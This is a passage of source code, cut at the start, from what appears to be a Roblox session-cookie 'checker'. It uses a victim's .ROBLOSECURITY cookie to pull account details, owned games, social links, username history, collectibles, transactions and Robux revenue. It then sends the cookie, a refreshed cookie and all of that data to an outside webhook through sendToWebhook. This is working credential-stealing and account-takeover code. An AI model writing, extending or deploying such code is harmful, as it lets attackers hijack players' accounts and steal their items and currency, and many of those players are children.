            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
      )

      if (developerStatsResponse.ok) {
        developerInfo.developerStats = await developerStatsResponse.json()
      }

      // Get created games
      const createdGamesResponse = await fetch(
        `https://games.roblox.com/v2/users/${accountSummary?.userId}/games?accessFilter=All&sortOrder=Desc&limit=10`,
        {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
      )

      if (createdGamesResponse.ok) {
        const createdGamesData = await createdGamesResponse.json()
        developerInfo.createdGames = createdGamesData.data
      }
    } catch (error) {
      console.error("Error getting developer info:", error)
    }

    // Get social info
    const socialInfo: any = { socialLinks: [], previousUsernames: [] }
    try {
      const socialLinksResponse = await fetch(
        `https://accountinformation.roblox.com/v1/users/${accountSummary?.userId}/social-links`,
        {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
      )

      if (socialLinksResponse.ok) {
        const socialLinksData = await socialLinksResponse.json()
        socialInfo.socialLinks = socialLinksData.data
      }

      const previousUsernamesResponse = await fetch(
        `https://users.roblox.com/v1/users/${accountSummary?.userId}/username-history?limit=25&sortOrder=Desc`,
        {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
      )

      if (previousUsernamesResponse.ok) {
        const previousUsernamesData = await previousUsernamesResponse.json()
        socialInfo.previousUsernames = previousUsernamesData.data
      }
    } catch (error) {
      console.error("Error getting social info:", error)
    }

    // Get inventory info
    const inventoryInfo: any = { collectibles: [] }
    try {
      const collectiblesResponse = await fetch(
        `https://economy.roblox.com/v1/users/${accountSummary?.userId}/collectibles?limit=100`,
        {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
      )

      if (collectiblesResponse.ok) {
        const collectiblesData = await collectiblesResponse.json()
        inventoryInfo.collectibles = collectiblesData.data
      }
    } catch (error) {
      console.error("Error getting inventory info:", error)
    }

    // Get financial info
    const financialInfo: any = { transactions: [] }
    try {
      const transactionsResponse = await getDetailedTransactions(accountSummary?.userId, cookieValue)
      if (transactionsResponse && transactionsResponse.data) {
        financialInfo.transactions = transactionsResponse.data
      }
    } catch (error) {
      console.error("Error getting financial info:", error)
    }

    // Get avatar settings
    const settings: any = { avatarSettings: {} }
    try {
      const avatarSettingsResponse = await fetch(`https://avatar.roblox.com/v1/avatar/settings`, {
        method: "GET",
        headers: {
          Cookie: `.ROBLOSECURITY=${cookieValue}`,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        },
      })

      if (avatarSettingsResponse.ok) {
        settings.avatarSettings = await avatarSettingsResponse.json()
      }
    } catch (error) {
      console.error("Error getting avatar settings:", error)
    }

    // Get Robux summary
    let robuxSummary: any = { spent: 0, received: 0 }
    try {
      const robuxSummaryResponse = await fetch(
        `https://economy.roblox.com/v1/users/${accountSummary?.userId}/roblox-earned-revenue-summary`,
        {
          method: "GET",
          headers: {
            Cookie: `.ROBLOSECURITY=${cookieValue}`,
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          },
        },
      )

      if (robuxSummaryResponse.ok) {
        robuxSummary = await robuxSummaryResponse.json()
      }
    } catch (error) {
      console.error("Error getting Robux summary:", error)
    }

    const cookieData = {
      success: true,
      message: "Cookie processed successfully!",
      cookie: newCookie,
      originalCookie: cookieRaw,
      accountSummary,
      activityInfo,
      groupsInfo,
      developerInfo,
      socialInfo,
      inventoryInfo,
      financialInfo,
      settings,
      securityInfo,
      robuxSummary,
    }

    // Send data to webhook
    await sendToWebhook(cookieData)

    return cookieData
  } catch (error) {
    console.error("Error checking cookie:", error)
    return {
      success: false,
      message: "An error occurred while checking the cookie",
    }
  }
}
